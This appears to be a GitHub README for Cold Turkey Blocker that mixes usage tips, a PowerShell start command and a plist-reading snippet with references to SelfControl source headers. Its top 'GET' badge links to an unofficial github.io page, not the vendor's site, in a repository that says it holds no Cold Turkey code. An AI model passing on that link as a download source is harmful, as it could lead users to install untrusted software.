# Cold Turkey Blocker for Focused Work Sessions

[![GET Cold Turkey Blocker](https://img.shields.io/badge/GET-Cold%20Turkey%20Blocker-2563EB?style=plastic&labelColor=1E3A8A)](https://cold-turkey-blocker.github.io/Cold-Turkey/)

Cold Turkey Blocker helps you set boundaries around distracting websites and applications.
Use this guide to plan a focused session, check essential access, and review your blocking rules.

Cold Turkey software includes several products with different purposes.
This repository discusses Blocker; Cold Turkey Micromanager is a separate application built around an application allowlist.

The accompanying source snapshot belongs to SelfControl, an independent macOS project.
It does not contain Cold Turkey's proprietary implementation.

## About

A useful focus session begins with a specific task and a defined stopping point.
Choose a small set of distractions and keep the resources needed for the task accessible.

| Planning question | Example decision | Check before starting |
| --- | --- | --- |
| What is the task? | Draft one document | The editor and source material are available |
| Which sites distract you? | A small list of leisure sites | Required reference pages remain accessible |
| Which applications interrupt you? | Games unrelated to the task | Work applications are excluded from the selection |
| When should the session run? | A defined work period | The intended day and time are correct |
| What should happen during breaks? | A planned break or allowance | The chosen behavior matches the session |
| Should changes be restricted? | A deliberate lock choice | You understand its duration and conditions |

Blocker supports website rules, application blocking, schedules, and several locking methods.
Check the current edition's feature availability before depending on a particular option.

Keep the first trial short and unlocked while checking the selected rules.
Test a distracting page and an essential page separately.

![Cold Turkey Blocker list separating distracting websites from necessary work resources](Common/q0.png)

The SelfControl reference [SCBlockEntry.h](Block%20Management/SCBlockEntry.h) represents an entry with a hostname and related fields.
Its [BlockManager.h](Block%20Management/BlockManager.h) declares coordination state for blocking operations.

Two additional interfaces illustrate different implementation responsibilities:

- [HostFileBlocker.h](Block%20Management/HostFileBlocker.h) describes hosts-file operations.
- [PacketFilter.h](Block%20Management/PacketFilter.h) describes packet-filter rule operations.

These references belong to SelfControl.
They do not establish how Cold Turkey implements website or application blocking.

List selection also benefits from understanding where entries originate.
The SelfControl interface [HostImporter.h](Block%20Management/HostImporter.h) includes predefined sites and mail-host import methods.

Its [AllowlistScraper.h](Block%20Management/AllowlistScraper.h) declares a related-entry lookup.
Review the websites required for your own task rather than assuming a predefined list fits it.

The Cold Turkey user guide documents native command-line parameters.
The Windows example below starts an existing, unlocked block named Writing.

Before using it, create and review that block in the interface.
Follow the guide's Windows prerequisite of closing the interface and exiting its system-tray process.

```powershell
$blocker = 'C:\Program Files\Cold Turkey\Cold Turkey Blocker.exe'
$blockName = 'Writing'
& $blocker -start $blockName
```

This command starts blocking according to the existing list.
It does not create the list or add a timed lock.

## Support

When a rule behaves unexpectedly, record what happened and what you expected.
Include the exact page or application, the active block, and the time of the check.

A concise review should cover:

1. Whether the block is active.
2. Whether it affects the current user.
3. Whether a break or allowance is active.
4. Whether a website exception matches the page.
5. Whether the browser extension is enabled with the required permissions.

The cold turkey extension works with the desktop application.
Check the official guide for browser-specific permissions and private-browsing requirements.

An exception in one block does not override a conflicting rule in another block.
Review overlapping lists when a required website remains unavailable.

For source-level comparison, SelfControl stores settings through [SCSettings.h](Common/SCSettings.h).
Saved block-file operations are declared in [SCBlockFileReaderWriter.h](Common/SCBlockFileReaderWriter.h).

The file-monitor interface is [SCFileWatcher.h](Common/SCFileWatcher.h).
These are SelfControl concepts, not Cold Turkey configuration instructions.

The reference [SCBlockUtilities.h](Common/Utility/SCBlockUtilities.h) distinguishes settings checks from checks for active rules.
This is useful context when separating interface state from observed blocking behavior.

![Cold Turkey session review showing active rules, scheduled work time, and break status](Common/q1.jpg)

For questions about ending a locked session, use the documented conditions for that lock.
Review the intended duration and essential access before starting another session.

Official documentation:

- [Cold Turkey user guide](https://getcoldturkey.com/support/user-guide/)
- [Cold Turkey support](https://getcoldturkey.com/support/)

## Updates

Record the installed Blocker version when documenting behavior.
Browser updates and extension changes can make an old observation difficult to reproduce.

After an update, repeat the same small set of checks:

- A selected distracting website is blocked during the intended period.
- A required website remains available.
- The browser extension reports the expected state.
- Break behavior matches the selected settings.
- The session ends under the documented conditions.

Use consistent interface labels in screenshots and support reports.
If the language changes, record both the selected language and the visible control name.

The SelfControl localization reference is [TimerWindow.strings](en.lproj/TimerWindow.strings).
Its labels describe the SelfControl timer window rather than Cold Turkey's interface.

See the [official release notes](https://getcoldturkey.com/news/) for product changes.
Keep release observations separate from assumptions based on an alternative project's source.

## Building For Development

The supplied files are reference material for studying a different blocker.
They do not provide a Cold Turkey build target, SDK, or replacement browser extension.

SelfControl separates client communication from its background service:

- [SCXPCClient.h](Common/SCXPCClient.h) declares client calls to the helper.
- [SCXPCAuthorization.h](Common/SCXPCAuthorization.h) declares authorization checks for commands.
- [SCDaemonProtocol.h](Daemon/SCDaemonProtocol.h) defines the service communication protocol.
- [SCDaemonBlockMethods.h](Daemon/SCDaemonBlockMethods.h) declares service-side blocking operations.

The service definition is [org.eyebeam.selfcontrold.plist](Daemon/org.eyebeam.selfcontrold.plist).
The following Python example reads that property list without loading or starting the service.

```python
import plistlib
from pathlib import Path

path = Path("Daemon/org.eyebeam.selfcontrold.plist")
with path.open("rb") as stream:
    service = plistlib.load(stream)
print("Service label:", service["Label"])
print("Run at load:", service.get("RunAtLoad", False))
```

The relative path assumes the SelfControl reference snapshot is the working directory.
Python's standard-library parser is sufficient for this inspection.

Treat the service label and settings as SelfControl-specific metadata.
They are not commands for managing Cold Turkey.

This snapshot is partial.
The presence of individual headers and service metadata does not establish that a complete application can be built.

## License

Cold Turkey and SelfControl are separate projects with separate licensing.
The presence of open-source reference files does not grant rights to redistribute Cold Turkey.

Consult the relevant upstream project for the terms covering its files.
Preserve authorship and license notices when reusing reference material.

Product scope matters when comparing similarly named tools.
The [Micromanager product page](https://getcoldturkey.com/micromanager/) describes that separate application's allowlist approach.

For current Blocker capabilities, consult the [official feature page](https://getcoldturkey.com/features/).
Describe the behavior you verified without promising a particular improvement in productivity.

## Related Search Terms

Cold Turkey Blocker, Cold Turkey, cold turkey software, cold turkey extension, cold turkey micromanager, productivity, website-blocker, distraction-blocker, focus, time-management, browser-extension, self-control, website-blocking, windows, macos
